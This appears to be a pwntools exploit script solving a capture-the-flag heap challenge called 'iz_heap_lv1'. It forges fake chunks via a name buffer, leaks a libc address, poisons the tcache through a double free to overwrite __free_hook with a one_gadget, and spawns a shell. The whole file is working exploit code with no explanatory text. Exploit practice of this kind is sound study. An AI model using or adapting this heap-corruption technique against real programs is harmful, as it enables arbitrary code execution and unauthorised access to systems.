from pwn import *
context.log_level = 'debug'

TARGET = './iz_heap_lv1'
HOST = ''
PORT = 0

# r = process(TARGET)
r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
# r = remote(HOST, PORT)

gdb.attach(r, '''
c
''')
elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

def add(size, data):
    r.sendline('1')
    r.sendlineafter('size:', str(size))
    r.sendlineafter('data:', data)
    r.recvuntil('Choice:')

def edit(index, size, data): 
    r.sendline('2')
    r.sendlineafter('index:', str(index))
    r.sendlineafter('size:', str(size))
    r.sendlineafter('data:', data)
    r.recvuntil('Choice:')

def delete(index):
    r.sendline('3')
    r.sendlineafter('index:', str(index))
    r.recvuntil('Choice:')

def show(new=''):
    r.sendline('4')
    if new != '': 
        r.sendlineafter('(Y/N)', 'Y')
        r.sendlineafter('name:', new)
    else:
        r.sendlineafter('(Y/N)', 'N')
    text = r.recvuntil('Choice:')
    return text 

r.sendlineafter('name:', p64(0))
r.recvuntil('Choice:')

payload = p64(0x602100+0x20) + p64(0) * 2 + p64(0x91) + p64(0)*17 + p64(0x21) + p64(0) * 3 + p64(0x21) + p64(0) * 2 
# payload = p64(0x602100+0x20) + p64(0) * 2 + p64(0x91) + p64(0)*17 + p64(0x21) + p64(0) * 3  # WE NEED 2 chunks !!!!

for i in range(8):
    show(payload) 
    edit(20, 0x10, 'AAAA')
leak = u64(show('A'*0x27).split('\n')[1].ljust(8, '\x00'))
dbg("leak")
base = leak - 0x3ebd20
dbg("base")

malloc_hook = base + 0x3ebc30
free_hook = base + 0x3ed8e8

gadget = [
0x4f2c5, # execve("/bin/sh", rsp+0x40, environ)
# constraints:
  # rcx == NULL

0x4f322, # execve("/bin/sh", rsp+0x40, environ)
# constraints:
  # [rsp+0x40] == NULL

0x10a38c # execve("/bin/sh", rsp+0x70, environ)
# constraints:
  # [rsp+0x70] == NULL
]

show(p64(0))
edit(20, 0x10, 'A')
leak_0x10 = u64(show().split('Name: ')[1].split('\n')[0].ljust(8, '\x00'))
dbg("leak_0x10")
delete(20)
show(p64(leak_0x10))
delete(20)
add(0x10, p64(free_hook))
add(0x10, 'XXXX')
add(0x18, p64(base + gadget[1]))

r.sendline('3')
r.sendlineafter('index:', '0')

r.interactive()
r.close()
